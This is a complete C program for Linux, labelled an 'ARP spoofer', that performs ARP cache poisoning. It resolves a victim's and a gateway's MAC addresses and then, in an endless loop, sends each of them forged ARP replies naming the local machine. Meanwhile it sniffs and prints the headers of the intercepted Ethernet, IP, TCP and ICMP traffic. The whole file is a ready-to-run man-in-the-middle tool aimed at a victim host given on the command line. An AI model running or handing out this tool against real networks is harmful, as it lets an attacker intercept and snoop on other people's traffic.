#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <net/ethernet.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/types.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>

#include <netinet/ip.h>
#include <net/ethernet.h>
#include <linux/tcp.h>
#include <netinet/ip_icmp.h>

/* get packet from kernel use raw socket */
void extract_ethernet_frame(unsigned char* , int);
void extract_ip_header(unsigned char* buffer, int size, int pointer);
void extract_icmp_packet(unsigned char* buffer, int size, int pointer);
void extract_tcp_packet(unsigned char* buffer, int size, int pointer);

/* constant values */
#define MAC_ADDR_LEN 0x06  /* MAC address length (48 bits) */
#define IPv4_ADDR_LEN 0x04  /* IPv4 address length (32 bits) */

#define ETH_TYPE_PROTO_ARP 0x806  /* EtherType value of ARP */

#define ARP_HTYPE_ETH 1  /* Ethernet */
#define ARP_PTYPE_IP 0x0800  /* IPv4 */

#define ARP_OPER_REQUEST 1  /* ARP request */
#define ARP_OPER_REPLY 2  /* ARP reply */

#define BUFFSIZE 65536

/* Ethernet frame struct */
typedef struct{
    uint8_t dest[MAC_ADDR_LEN]; /* destination MAC address */
    uint8_t src[MAC_ADDR_LEN];  /* source MAC address */
    uint16_t type;              /* EtherType */
} etherheader_t;

/* ARP packet struct */
typedef struct{
    uint16_t htype;                     /* hardware type */
    uint16_t ptype;                     /* protocol type */
    unsigned char hlen;                 /* hardware length */
    unsigned char plen;                 /* protocol length */
    uint16_t op;                        /* operation */
    unsigned char sha[MAC_ADDR_LEN];    /* sender hardware address */
    unsigned char spa[IPv4_ADDR_LEN];   /* sender protocol address */
    unsigned char tha[MAC_ADDR_LEN];    /* target hardware address */
    unsigned char tpa[IPv4_ADDR_LEN];   /* target protocol address */
} arpheader_t;

unsigned char localMAC[MAC_ADDR_LEN];   /* local MAC address */
struct in_addr localIP;                 /* local IP address */
char interfaceName[256];                /* network interface name */

/* check if user is root */
int isUserRoot(){
    /* root's UID is 0 */
    if (getuid() == 0)
        return 1;
    else
        return 0;
}

/* get index of interface */
int getIfIndex(const char* ifname, int* outIfIndex){
    struct ifreq ifr;
    strcpy(ifr.ifr_name, ifname);

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    /* getting interface index */
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == 0){
        /* copy index to output variable */
        *outIfIndex = ifr.ifr_ifindex;
        close(sockfd);
        return 0;
    }

    /* if error occurred */
    perror("ioctl");
    close(sockfd);
    return -1;
}

/* print MAC address in readable format */
void printMacAddress(const unsigned char* mac){
    /* print MAC address in format aa:bb:cc:dd:ee:ff */
    printf("%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
}

/* get MAC address of local machine */
int getLocalMacAddress(const char* ifname, unsigned char* outMac){
    struct ifreq ifr;
    strcpy(ifr.ifr_name, ifname);

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    /* getting interface's hardware address */
    if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == 0){
        /* copy MAC address to output variable */
        memcpy(outMac, ifr.ifr_addr.sa_data, MAC_ADDR_LEN);
        close(sockfd);
        return 0;
    }

    /* if error occurred */
    perror("ioctl");
    close(sockfd);
    return -1;
}

/* print IPv4 address in readable format */
void printIpAddress(const struct in_addr ip){
    /* print IPv4 address in dotdecimal format */
    printf("%s", inet_ntoa(ip));
}

/* get MAC address of local machine */
int getLocalIpAddress(const char* ifname, struct in_addr* outIp){
    struct ifreq ifr;
    strcpy(ifr.ifr_name, ifname);
    ifr.ifr_addr.sa_family = AF_INET;

    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    /* getting interface's IP address */
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) == 0){
        struct sockaddr_in* addr = (struct sockaddr_in*)&ifr.ifr_addr;

        /* copy IP address to output variable */
        memcpy(outIp, &addr->sin_addr, sizeof(struct in_addr));
        close(sockfd);
        return 0;
    }

    /* if error occurred */
    perror("ioctl");
    close(sockfd);
    return -1;
}

/* get MAC address of remote host using ARP request */
int getMacAddress(const struct in_addr ip, unsigned char* outMac){
    etherheader_t etherFrame;
    arpheader_t arpRequest;
    unsigned char broadcastMAC[MAC_ADDR_LEN] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    size_t frameSize = sizeof(etherheader_t) + sizeof(arpheader_t);
    unsigned char* frame = (unsigned char*)malloc(frameSize);
    memset(frame, 0, frameSize);
    int count = 100;

    /* create Ethernet frame */
    memcpy(&etherFrame.dest, broadcastMAC, MAC_ADDR_LEN);
    memcpy(&etherFrame.src, localMAC, MAC_ADDR_LEN);
    etherFrame.type = htons(ETH_TYPE_PROTO_ARP);

    /* create ARP packet */
    arpRequest.op = htons(ARP_OPER_REQUEST);
    arpRequest.htype = htons(ARP_HTYPE_ETH);
    arpRequest.hlen = MAC_ADDR_LEN;
    arpRequest.ptype = htons(ARP_PTYPE_IP);
    arpRequest.plen = IPv4_ADDR_LEN;
    memcpy(&arpRequest.tha, broadcastMAC, MAC_ADDR_LEN);
    memcpy(&arpRequest.tpa, &ip, sizeof(struct in_addr));
    memcpy(&arpRequest.sha, localMAC, MAC_ADDR_LEN);
    memcpy(&arpRequest.spa, &localIP, sizeof(struct in_addr));
    
    int sockfd;

    /* create socket to send ARP request */
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0){
        /* if error occurred */
        perror("socket");
        free(frame);
        return -1;
    }

    struct ifreq ifr;
    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));

    /* bind socket to the interface */
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0){
        /* if error occurred */
        perror("setsockopt");
        close(sockfd);
        free(frame);
        return -1;
    }

    int ifindex;
    if(getIfIndex(interfaceName, &ifindex) < 0){
        /* if error occurred */
        perror("ioctl");
        close(sockfd);
        free(frame);
        return -1;
    }

    /* socket address struct (link-layer) */
    struct sockaddr_ll sockAddr;
    sockAddr.sll_family = AF_PACKET;
    sockAddr.sll_protocol = htons(ETH_P_ARP);
    sockAddr.sll_halen = MAC_ADDR_LEN;
    sockAddr.sll_hatype = htons(ARPHRD_ETHER);
    sockAddr.sll_ifindex = ifindex;
    sockAddr.sll_pkttype = (PACKET_BROADCAST);
    memcpy(&sockAddr.sll_addr, &arpRequest.sha, MAC_ADDR_LEN);

    memcpy(frame, &etherFrame, sizeof(etherFrame));
    memcpy(frame + sizeof(etherFrame), &arpRequest, sizeof(arpRequest));

    /* send ARP request */
    if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0){
        /* if error occurred */
        perror("sendto");
        free(frame);
        return -1;
    }

    free(frame);

    int i;
    unsigned char buffer[BUFFSIZE];

    /* receive ARP reply */
    for (i = 0; i < count; i++){
        memset(buffer, 0, BUFFSIZE);
        if(recvfrom(sockfd, buffer, BUFFSIZE, 0, NULL, NULL) < 0){
            /* if error occurred */
            perror("recvfrom");
            continue;
        }

        /* dissect Ethernet frame from received buffer */
        etherheader_t* ethFrameRecvd = (etherheader_t*)buffer;

        /* if frame is ARP */
        if (ntohs(ethFrameRecvd->type) == ETH_TYPE_PROTO_ARP){
            /* dissect Ethernet frame from received buffer */
            arpheader_t* arpResp = (arpheader_t*)(buffer + sizeof(etherheader_t));
            if (ntohs(arpResp->op) == 2){
                /* copy MAC address of remote host to output */
                memcpy(outMac, ethFrameRecvd->src, MAC_ADDR_LEN);
                return 0;
            }
        }
    }

    return -1;
}

/* sending spoofed ARP packet */
int sendGratuitousArpReply(const struct in_addr destIP, const unsigned char* destMAC, const struct in_addr srcIP, const unsigned char* srcMAC){
    etherheader_t etherFrame;
    arpheader_t arpReply;
    size_t frameSize = sizeof(etherheader_t) + sizeof(arpheader_t);
    unsigned char* frame = (unsigned char*)malloc(frameSize);
    memset(frame, 0, frameSize);

    /* create Ethernet frame */
    memcpy(&etherFrame.dest, destMAC, MAC_ADDR_LEN);
    memcpy(&etherFrame.src, srcMAC, MAC_ADDR_LEN);
    etherFrame.type = htons(ETH_TYPE_PROTO_ARP);

    /* create ARP packet */
    arpReply.op = htons(ARP_OPER_REPLY);
    arpReply.htype = htons(ARP_HTYPE_ETH);
    arpReply.hlen = MAC_ADDR_LEN;
    arpReply.ptype = htons(ARP_PTYPE_IP);
    arpReply.plen = IPv4_ADDR_LEN;
    memcpy(&arpReply.tha, destMAC, MAC_ADDR_LEN);
    memcpy(&arpReply.tpa, &destIP, sizeof(struct in_addr));
    memcpy(&arpReply.sha, srcMAC, MAC_ADDR_LEN);
    memcpy(&arpReply.spa, &srcIP, sizeof(struct in_addr));
    
    int sockfd;

    /* create socket to send ARP packet */
    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0){
        /* if error occurred */
        perror("socket");
        free(frame);
        return -1;
    }

    struct ifreq ifr;
    strncpy((char*)&ifr.ifr_name, interfaceName, sizeof(ifr.ifr_name));

    /* bind socket to the interface */
    if (setsockopt(sockfd, SOL_SOCKET, SO_BINDTODEVICE, &ifr, sizeof(ifr)) < 0){
        /* if error occurred */
        perror("setsockopt");
        close(sockfd);
        free(frame);
        return -1;
    }

    int ifindex;
    if(getIfIndex(interfaceName, &ifindex) < 0){
        /* if error occurred */
        perror("ioctl");
        close(sockfd);
        free(frame);
        return -1;
    }

    /* socket address struct (link-layer) */
    struct sockaddr_ll sockAddr;
    sockAddr.sll_family = AF_PACKET;
    sockAddr.sll_protocol = htons(ETH_P_ARP);
    sockAddr.sll_halen = MAC_ADDR_LEN;
    sockAddr.sll_hatype = htons(ARPHRD_ETHER);
    sockAddr.sll_ifindex = ifindex;
    sockAddr.sll_pkttype = (PACKET_MR_UNICAST);
    memcpy(&sockAddr.sll_addr, &arpReply.sha, MAC_ADDR_LEN);

    memcpy(frame, &etherFrame, sizeof(etherFrame));
    memcpy(frame + sizeof(etherFrame), &arpReply, sizeof(arpReply));

    /* send ARP packet */
    if (sendto(sockfd, frame, frameSize, 0, (struct sockaddr*)&sockAddr, sizeof(struct sockaddr_ll)) < 0){
        /* if error occurred */
        perror("sendto");
        free(frame);
        return -1;
    }

    free(frame);

    return 0;
}

/* ARP cache poisoning infinite loop */
void poisonArp(const struct in_addr victimIP, const unsigned char* victimMAC, const struct in_addr gatewayIP, const unsigned char* gatewayMAC){
    pid_t pid = fork();
    if (pid == 0){      // child process
        while (1){
            if (sendGratuitousArpReply(victimIP, victimMAC, gatewayIP, localMAC) < 0){
                printf("Send ARP reply to victim failed \n");
            }
            else{
                printf("Send ARP reply to victim \n");
            }

            if (sendGratuitousArpReply(gatewayIP, gatewayMAC, victimIP, localMAC) < 0){
                printf("Send ARP reply to gateway failed \n ");
            }
            else{
                printf("Send ARP reply to gateway \n");
            }
            sleep(10);
        }
    }
    else{       // parent process
        while (1){
            // Create a raw socket that accepts packets.
            int r_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
            if (r_sock == -1){
                perror("Socket creation failed. \n");
                exit(1);
            }
            // Create a buffer to accept incomming packets
            int packet_size;
            unsigned char *buffer = (unsigned char *)malloc(65536);

            packet_size = recvfrom(r_sock, buffer, 65536, 0, NULL, NULL);
            if (packet_size == -1){
                printf("Failed to get packet \n");
            }
            extract_ethernet_frame(buffer, packet_size);
        }
    }
}

int total=0;
struct sockaddr_in source, dest;

/*Ethernet Frame Structure :
    (Preamable + SDF = 8) | (6) Destination * | (6) Source * | (2) Type *
*/
void extract_ethernet_frame(unsigned char* buffer, int size){
    //Declare pointer called eth to an ethhdr structure;
    struct ethhdr * eth = (struct ethhdr *)(buffer);

    printf("Ethernet Frame: \n");
    printf("\t  | Source MAC: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X", eth->h_source[0], eth->h_source[1], eth->h_source[2], eth->h_source[3], eth->h_source[4], eth->h_source[5]);
    printf("    | Destination MAC: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X", eth->h_dest[0], eth->h_dest[1], eth->h_dest[2], eth->h_dest[3], eth->h_dest[4], eth->h_dest[5]);
    printf("    | Protocol : %d\n", eth->h_proto);

    //Extract the next layer: (IP)
    int pointer = sizeof(struct ethhdr);
    extract_ip_header(buffer, size, pointer);
}

/*IP Header Structure :
  (4) Version * | (4) Header Length * | (8) Type * |
  (16) Length Total | (16) Trusted Host ID | (3) Flags | (13) Fragment Offset
  (8) TTL * | (8) Protocol * | (16) Checksum * | (32) Src Addr * | (32) Dest Addr *
  (x * 32) Options & Padding.
*/
void extract_ip_header(unsigned char* buffer, int size, int pointer){
    printf("IP Header: \n");
    //Buffer is a pointer; iphdr located after ethernet header
    struct iphdr *iph = (struct iphdr*)(buffer + pointer); //Buffer is a pointer;

    //IP length + size of iphdr
    pointer = pointer + sizeof(struct iphdr) + ((unsigned int)(iph->ihl))*4;

    //Reset the address value; fill with saddr from the ip header.
    memset(&source, 0, sizeof(source));
    source.sin_addr.s_addr = iph->saddr;
    memset(&dest, 0, sizeof(dest));
    dest.sin_addr.s_addr = iph->daddr;

    printf("\t |IP Version: %d", (unsigned int)iph->version);
    printf("   |Header Length: %d Bytes", ((unsigned int)(iph->ihl))*4);
    printf("   |TTL: %d", (unsigned int)iph->ttl);
    printf("   |Protocol: %d\n", (unsigned int)iph->protocol);

    //inet_ntoa: Accepts Internet address (32-bit quantity in network byte order)
    //Returns string in dotted notation.
    printf("\t |SourceIP : %s", inet_ntoa(source.sin_addr));
    printf("   |Destination IP: %s\n", inet_ntoa(dest.sin_addr));

    int protocol  = (unsigned int)iph->protocol;
    //Different protocols result in different structures.
    if (protocol == 1){ //ICMP
        printf("ICMP\n");
        extract_icmp_packet(buffer, size, pointer);
    } else if (protocol == 6){  // TCP
        printf("TCP\n");
        extract_tcp_packet(buffer, size, pointer);
    }
}

/*
  TCP Packet
  (16) Source * | (16) Dest * | (32) Sequence Num * | (32) Acknowledgement Num *
  (var) Data Offset (Header Length) | (6) Reserved | (6) Flags *| (16) Window
  (16) Checksum | (16) Urgent Pointer | (var) Options | (var) Data 
*/
void extract_tcp_packet(unsigned char* buffer, int size, int pointer){
    struct tcphdr * tcph = (struct tcphdr *)(buffer + pointer);
    printf("| - Source Port: %u", ntohs(tcph->source));
    printf(" - Destination Port: %u\n", ntohs(tcph->dest));
    printf("| - Sequence: %u", tcph->seq);
    printf("| - Acknowledgement: %u\n",tcph->ack_seq);
    printf("FLAGS: ");
    printf("URG: %d, ACK: %d, PSH: %d,", tcph->urg, tcph->ack, tcph->psh);
    printf(" RST: %d, SYN: %d, FIN: %d\n", tcph->rst, tcph->syn, tcph->fin);
}

/* ICMP Packet structure:
    (4) Type * | (4) Code  * | (8) Checksum * | (x*32) Data *
*/
void extract_icmp_packet(unsigned char* buffer, int size, int pointer){
    struct icmphdr * icmp = (struct icmphdr *)(buffer + pointer);
    printf("ICMP Packet: ");
    printf("ICMP msgtype=%d, code=%d\n", icmp->type, icmp->code);
}


int main(int argc, char* argv[]){
    if(!isUserRoot()){
        printf("Run this as root\n");
        return 0;
    }

    if (argc < 4){
        printf("usage: sudo %s <iface name> <vitcim's IP> <gateway's IP>", argv[0]);
        return 0;
    }

    printf("Linux ARP spoofer\n-----------------\n");

    strcpy(interfaceName, argv[1]);

    printf("Looking for MAC addresses...\n");

    if(getLocalMacAddress(interfaceName, localMAC) == -1){
        printf("Error during checking local MAC address\n");
        return -1;
    }
    else{
        printf("Local MAC address is ");
        printMacAddress(localMAC);
        printf("\n");
    }

    if(getLocalIpAddress(interfaceName, &localIP) == -1){
        printf("Error during checking local IP address\n");
    }
    else{
        printf("Local IP address is ");
        printIpAddress(localIP);
        printf("\n");
    }

    struct in_addr victimIP;
    victimIP.s_addr = inet_addr(argv[2]);
    unsigned char victimMAC[MAC_ADDR_LEN];

    struct in_addr gatewayIP;
    gatewayIP.s_addr = inet_addr(argv[3]);
    unsigned char gatewayMAC[MAC_ADDR_LEN];

    if (getMacAddress(victimIP, victimMAC) < 0){
        printf("Unable to find victim's MAC address\n");
        return -1;
    }
    else{
        printf("Victim's (%s) MAC address: ", argv[2]);
        printMacAddress(victimMAC);
        printf("\n");
    }

    if (getMacAddress(gatewayIP, gatewayMAC) < 0){
        printf("Unable to find gateway's MAC address\n");
        return -1;
    }
    else{
        printf("Gateway's (%s) MAC address: ", argv[3]);
        printMacAddress(gatewayMAC);
        printf("\n");
    }

    printf("Poisoning...\n");
    poisonArp(victimIP, victimMAC, gatewayIP, gatewayMAC);

    return 0;
}
